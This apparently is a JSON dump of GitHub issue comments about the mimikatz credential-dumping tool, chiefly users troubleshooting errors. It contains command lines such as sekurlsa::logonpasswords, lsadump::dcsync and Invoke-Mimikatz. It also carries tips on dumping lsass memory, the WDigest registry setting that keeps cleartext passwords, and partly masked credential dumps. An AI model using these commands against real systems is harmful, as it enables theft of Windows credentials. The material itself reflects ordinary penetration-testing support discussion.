process\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeSecurityPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Manage auditing and security log\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeTakeOwnershipPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Take ownership of files or other objects\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeLoadDriverPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Load and unload device drivers\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeSystemProfilePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Profile system performance\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeSystemtimePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Change the system time\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeProfileSingleProcessPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Profile single process\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeIncreaseBasePriorityPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Increase scheduling priority\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeCreatePagefilePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Create a pagefile\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeBackupPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Back up files and directories\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeRestorePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Restore files and directories\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeShutdownPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Shut down the system\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeDebugPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Debug programs\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeSystemEnvironmentPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Modify firmware environment values\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeChangeNotifyPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Bypass traverse checking\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Enabled\nSeRemoteShutdownPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Force shutdown from a remote system\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeUndockPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Remove computer from docking station\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeManageVolumePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Perform volume maintenance tasks\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeImpersonatePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Impersonate a client after authentication\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Enabled\nSeCreateGlobalPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Create global objects\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Enabled\nSeIncreaseWorkingSetPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Increase a process working set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeTimeZonePrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Change the time zone\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeCreateSymbolicLinkPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Create symbolic links\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Disabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled\nUSER CLAIMS INFORMATION\nClaim Name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Claim ID\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Flags Type\u00a0\u00a0 Values\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n==================== =========================== ===== ====== ========================\n\"AuthenticationSilo\" ad://ext/AuthenticationSilo\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 String \"Restricted_Admin_Logon\"\n```\n. ",
    "Twan14": "can someone help me with this error?\n.#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)  Kitten Edition \n ## / \\ ##  / Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   /\nERROR kull_m_busylight_devices_get ; CreateFile (deviceHandle) (0x00000005)\nERROR kull_m_busylight_devices_get ; CreateFile (deviceHandle) (0x00000005)\nERROR kull_m_busylight_devices_get ; CreateFile (deviceHandle) (0x00000005)\nERROR kull_m_busylight_devices_get ; CreateFile (deviceHandle) (0x00000005)\nERROR kull_m_busylight_devices_get ; CreateFile (deviceHandle) (0x00000005). ",
    "strasharo": "Is this:\n\nWhen HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest, UseLogonCredential (DWORD) is set to 1, the wdigest provider keeps passwords ;\n\nvalid for Windows Server 2012 R2 Standard x64?\nIt's set, however I'm not able to fetch my creds used in an incoming RDP connection.\n. ",
    "jaegerschnitzel": "Is it possible to prevent the kerberos provider to cache passwords? If yes how?\nEven if DCs are reachable the cleartext password is shown under Windows 10 Enterprise x64.\n\nAuthentication Id : 0 ; 1568134 (00000000:0017ed86)\nSession           : CachedInteractive from 1\nUser Name         : sureadm\nDomain            : INT.CORP\nLogon Server      : INT03DC\nLogon Time        : 06.07.2017 14:48:56\nSID               : S-1-5-21-862xx0103-xxxxxxxxxxxx-xxxxx\n        msv :\n         [00000003] Primary\n         * Username : sureadm\n         * Domain   : INT.CORP\n         * NTLM     : f50ef5a25xxxxxxxxxc141cff311d84xx2d\n         * SHA1     : 55ef902aecxxxxxxxxxxxxxxxx707d95f5050xxc55e\n         * DPAPI    : 659cb841xxxxxef3c669dxx75\n        tspkg :\n        wdigest :\n         * Username : sureadm\n         * Domain   : INT.CORP\n         * Password : (null)\n        kerberos :\n         * Username : sureadm\n         * Domain   : INT.CORP\n         * Password : XXXXXX\n        ssp :\n        credman :. \n",
    "sekurls123": "Is it possible if they are set to Allow* to still get password?. ",
    "mzsf3c": "Thx, that explains my issue.\n. ",
    "sfakiana": "Or may the wiki page (https://github.com/gentilkiwi/mimikatz/wiki) is supposed to be the updated official documentation? I have just seen it!\n. ",
    "th0m1": "i am the local admin \nso it can't be ran remotely ? \n. ",
    "bullguard01": "hello gentil.. i have a rainbow ikey 4000 with my certificate installed in it... mimikatz exports the pfx but I think its without the private key... mimikatz password didn't work .. please assist me .. thank you. ",
    "bhdresh": "Looks like operating system issue.\n. ",
    "asolino": "Hey @MichaelGrafnetter thanks for pointing this out! I'm downloading TP5 now and will give a try with impacket. Right now I'm expecting receiving DRS_EXT_GETCHGREPLY_V6. Cannot you control that through DRSBind.dwFlags?\n. All right.. fair point.. that for the clarification @MichaelGrafnetter!\n. That's uber potential! ;) ;) :)\nthanks for the quick turn around.. and likewise @gentilkiwi & @MichaelGrafnetter \n. ",
    "mehranexpert": "oh Sorry :+1: \nhere is my Log file \n```\nUsing 'new2.txt' for logfile : OK\nmimikatz # privilege::debug\nPrivilege '20' OK\nmimikatz # sekurlsa::logonpasswords\nERROR kuhl_m_sekurlsa_nt5_init ; kull_m_memory_search\nERROR kuhl_m_sekurlsa_acquireLSA ; Local LSA library failed\nmimikatz # lsadump::dcsync\n[DC] 'texas.test.com' will be the domain\n[DC] 'texas.test.local.com' will be the DC server\nERROR kuhl_m_lsadump_dcsync ; Missing user or guid argument\nmimikatz #\n```\nVersion of Windows : Windows 2003 Enterprise SP2 ( Build 3790.srv03_sp2_rtm.070216-1710)\nim run it from User have admin Permission . i dont run Windows Update \nalso my mimikatz version : 2.1 alpha 20160604 (oe.eo) edition\n. its x86 , i dont know why can't upload zip file here i uploaded on Dropbox \nminidump file\nlsasrv.dll\n. ",
    "aldo1901": "So to manually put these into a blah.kirbi I would just copy the encoding alone without the ===== lines or with======?\n\"====================\"\ndoIFOTCCBTWgAwIBBaEDAgEWooIELjCCBCphggQmMIIEIqADAgEFoREbD0NIT0NP\nTEFURS5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hPQ09MQVRFLkxPQ0FM\n...\nGA8yMDE0MDQyNDIyNTE0NFqnERgPMjAxNDA1MDExMjUxNDRaqBEbD0NIT0NPTEFU\nRS5MT0NBTKkkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hPQ09MQVRFLkxPQ0FM\n\"====================\"\n. ",
    "3gstudent": "I mean it is very troublesome for me to download the source code and compile it. :)\nI haven't seen your simple .exe before.\nLearn a new method from you again.\nThanks\uff01\n. Yeah,cert2spc.exe , pvk2pfx.exe and some other exe file are the most I use in SDKs.\n:)\n. ",
    "prof79": "https://slproweb.com/products/Win32OpenSSL.html is a no-brainer, use it all the time on Windows.\n. ",
    "simonuvarov": "@junkb it's ok, because mimikatz is often used during pentests. You can try to dump lsass.exe memory using procexplorer/taskmanager/procdump and then extract hashes/passwords from it.\n. ",
    "cfalta": "I use the latest mimikatz release, however the issue seems to occur only on one of my machines so the problem seems to be on my side.\nI don't know what's the reason yet but I'm still investigating.\nThanks and best regards, Christoph\n. ",
    "810978558": "How to perform the entire operation of the recording TXT\n. If you do not understand the meaning of trouble with google translation\n. ",
    "brandoncasaba": "Ah, I was able to get that to work... Is it possible to do the same thing with SeBackup privilege to get access to the hives instead of impersonating SYSTEM? \n. ",
    "AydinChavez": "Hi all,\nhave the same error message (in offline mode, having hive files stored on disk). How can this be solved? The answers here are a bit mysterious :)\n. ",
    "MatthewHKnight": "I remember this but I thought that ticket was deleted that's why I asked I guess I skipped my own ticket. I've taken note of the reply I get this question a lot in a video I did for mimikatz and every now and then someone always asks about why their password is showing up null I'm gonna link that issue in my video description.\n. ",
    "Gabba12113": "Thanks for your quick reply.\nThe machine is new and clean.\nNevertheless, i installed a new machine with the same settings. It works fine there. \nI think you can close this here.\nThanks.\n. ",
    "uamj": "Windows 7 Professional x64\nmimikatz 2.1 x64  20161005\nIm running it with administrator\n\n. ",
    "Daniel-league": "Run the tool like this:\n\nIt seems the output are ok , so  I import them, but check the certificate there are no private key within them\n\nCertutil command still need the smart card PIN code ,and result as below\n```\nC:\\WINDOWS\\system32>certutil -user -store my\nmy\n================ Certificate 0 ================\nSerial Number: 1d41cfef\nIssuer: CN=Issuing CA EE Auth 2013, OU=Copyright (C) AG 2013 All\n Rights Reserved, SERIALNUMBER=ZZZZZZY2, O=xfire, C=DE\n NotBefore: 7/12/2016 10:43 AM\n NotAfter: 7/12/2017 10:41 AM\nSubject: CN=Gggg, O=xfire-Partner, SN=g, G=ggg, SERIALNUMBER=Z0033gWR\nNon-root Certificate\nTemplate:\nCert Hash(sha1): e2 5d 5d 1a 0c 32 99 ea 6e c5 e2 95 47 cc 22 62 4e c0 d1 ee\nNo key provider information\nEncryption test FAILED\n================ Certificate 1 ================\nSerial Number: 7d02eb89\nIssuer: CN=Issuing CA EE Enc 2013, OU=Copyright (C) AG 2013 All\nRights Reserved, SERIALNUMBER=ZZZZZZY3, O=xfire, C=DE\n NotBefore: 7/12/2016 10:41 AM\n NotAfter: 7/12/2017 10:41 AM\nSubject: CN=Gggg, O=xfire-Partner, SN=G, G=ggg, SERIALNUMBER=Z0033gWR\nNon-root Certificate\nTemplate:\nCert Hash(sha1): d2 bb 06 48 29 08 27 6a ed bf 81 58 d0 01 3e a2 00 6d ab 88\nNo key provider information\nEncryption test FAILED\nCertUtil: -store command completed successfully.\n```\n. ",
    "flacostec": "Oh, I've just tested it and it worked! C'est merveilleux ! Merci pour votre excellent travail.. ",
    "moaeddy": "the logs i have are too long, is there command i can use to export the logs so i can attach here to really know what is going on?. ok bro, thanks i was able to get the pass by using mimikatz log export.\nNice job mate like the project. @billybob3 can you elaborate what you mean when you said  -m 1000 in hashcat ? mine too comes in (null) or hex value. ",
    "slacker69": "Yeah I think that might be it, I didn't install the correct driver kit. . ",
    "jmvdbreekel": "Dear @MichaelGrafnetter , apparently I was misinterpreting the results and I'm sorry about this unnecessarily opened issue. Thank you for your response! I was not aware that historical LM hashes would be generated randomly by the DC itself. For more information (in case anyone ever reaches this issue), check this site: https://labs.mwrinfosecurity.com/blog/when-lanman-history-reveals-the-present-and-future-but-might-just-be-lying-to-you/ . ",
    "lidm1989": "Sorry, \nPlease reference FreerRDP.\nWhen I follows the steps, crypto:cng got an error ERROR kull_m_patch_genericProcessOrServiceFromBuild ; kull_m_patch (0x00000000).\nRemember to forbid Windows Defender.\nVersions:\nWindows: Windos 8.1 Enterprise/Windows 10 Enterprise/Windows Server 2012 R2 standard.\nmimikatz: 20170121\n. Oh, yeah,\nI redo after reboot. It works well on win8/win10 on the first time after reboot. But not on windows server 2012 r2.. ",
    "AddaxSoft": "@gentilkiwi - I was looking to correct the wiki, but I can't seem to contribute to it. Can you please fix it as google search lands there? :). ",
    "KiUserExceptionDispatcher": "Agree. W10 LTSB not working.. ",
    "Blackbeard1st": "Should i need to enable the Credentials Delegation manually ? cause i don't know how to if necessery.\nplus\nthe values are not set at:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Credssp\\PolicyDefaults \ni cant find CredentialsDelegation in my registry in that path\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation <--\nso if we could fix these by manually enable Credentials Delegation in Registry it wold be nice trough commands in cmd or powershell.\nthx. -> gentilkiwi. ",
    "daniel0x00": "Ok Benjamin, thank you for your support. We all love your tool \ud83d\ude03\nBest regards!\nDaniel. \nSent from my iPhone\n\nOn 25 Mar 2017, at 14:12, Benjamin DELPY notifications@github.com wrote:\nHi Daniel,\nThank you for the report.\nBecause of some RPC stuff, I was ending the process too soon to let PowerShell knows about the result.\nIt will be back soon ;) (already fixed but I've other stuff to push ;))\nWindows PowerShell\nCopyright (C) 2016 Microsoft Corporation. Tous droits r\u00e9serv\u00e9s.\nPS C:\\Users\\gentilkiwi> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force\nPS C:\\Users\\gentilkiwi> . .\\Desktop\\Invoke-Mimikatz.ps1\nPS C:\\Users\\gentilkiwi> Invoke-Mimikatz -Command version\n.#####.   mimikatz 2.1.1 (x64) built on Mar 25 2017 14:01:06\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  / * \n ## \\ / ##   Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 21 modules *  /\nmimikatz(powershell) # version\nmimikatz 2.1.1 (arch x64)\nWindows NT 10.0 build 14393 (arch x64)\nmsvc 150030729 207\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n. \n",
    "chris001": "Avast antivirus is installed, although it is disabled temporarily, to permit mimikatz to run.\nWhen Avast antivirus is running, it blocks mimikatz from being downloaded to disk!. Are you saying, I must uninstall avast, and then, this mimikatz will work correctly on windows 10 x64?. OK but were you able to get mimikatz to work successfully on windows 10 x64 with only the default system protection app, windows defender?. @vletoux \nAfter so many security improvements in Windows, including the recent Meltdown fix causing the complete separation of kernel address space from user address space, etc, is this method used by mimikatz even working for anyone on Windows x64 anymore?. ",
    "wolf0x": "pls try to disable UAC and you would get it works.. ",
    "pixel-hustler": "Hi,\nsame as above, Win 10 64bit, only 1 admin user. I have disabled UAC.\nFew seconds after inserting rubber ducky, mimikatz starts as it supposed to, but getting an error.\n\n. ",
    "vletoux": "Did you check the error code ? MSDN is providing a description for each error:\nhttps://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx\n=> pls do not comment on closed issues\n\n. Tu testes pas au moins ????\nVincent\nLe dim. 3 sept. 2017 \u00e0 10:54, Benjamin DELPY notifications@github.com a\n\u00e9crit :\n\nMerged #98 https://github.com/gentilkiwi/mimikatz/pull/98.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/pull/98#event-1232551788, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AKI8hiRNu3AUcS8uVmCCq3o_TQUET2NGks5semlZgaJpZM4PLIMG\n.\n-- \n\n\nVincent\n. J'y ai pass\u00e9 du temps pour faire la modify en respectant l'esprit de ton\ncode.\nBien chi\u00e9 notamment pour obtenir le guid du domaine...\nV\nLe dim. 3 sept. 2017 \u00e0 11:09, Benjamin DELPY notifications@github.com a\n\u00e9crit :\n\nJ'ai jet\u00e9 un coup d\u2019\u0153il, cela \u00e0 l'air correcte ;)\nAu pire, je corrigerais quelques trucs, mais je prend ton code as-is.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/pull/98#issuecomment-326793296,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AKI8ho0xdzUszVj6kuS4IdI_vUsMYDm5ks5semzFgaJpZM4PLIMG\n.\n-- \n\n\nVincent\n. Short answer: \nno with setnlm\nyes with DCShadow\nBeware that the hash includes the domain name and if you are planing to change it this will be a problem.\nDid you check also a password filter ?. // MessageId: ERROR_DS_DRA_ACCESS_DENIED\n//\n// MessageText:\n//\n// Replication access was denied.\n//\ndefine ERROR_DS_DRA_ACCESS_DENIED       8453L. What Benjamin said is that silver ticket is used on the machine that will consume it. You need to embed the DC hash that will process your silver ticket. The admin hash has nothing to do here.. RPC_UNICODE_STRING are not classic c null terminated strings.\nThe length of the string is encoded into the structure and do not search for the null char to stop the string.\nThen in the parent structure, it is not a pointer that is used (not RPC_UNICODE_STRING *) but rather directly the string inside the structure. That means that a \u00ab\u00a0null\u00a0\u00bb string doesn\u2019t have any meaning here.\nAre you sure your patch are doing something?\nAccording to rtlinitializeunicodestring, it doesn\u2019t change anything: \nhttps://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlinitunicodestring\n. understood: your script is using the MaximumLength field of Unicode string while it should use the field Length only. . ",
    "Gomasdu54": "I think you're right, since this security fix mimikatz seems to be outdated..... ",
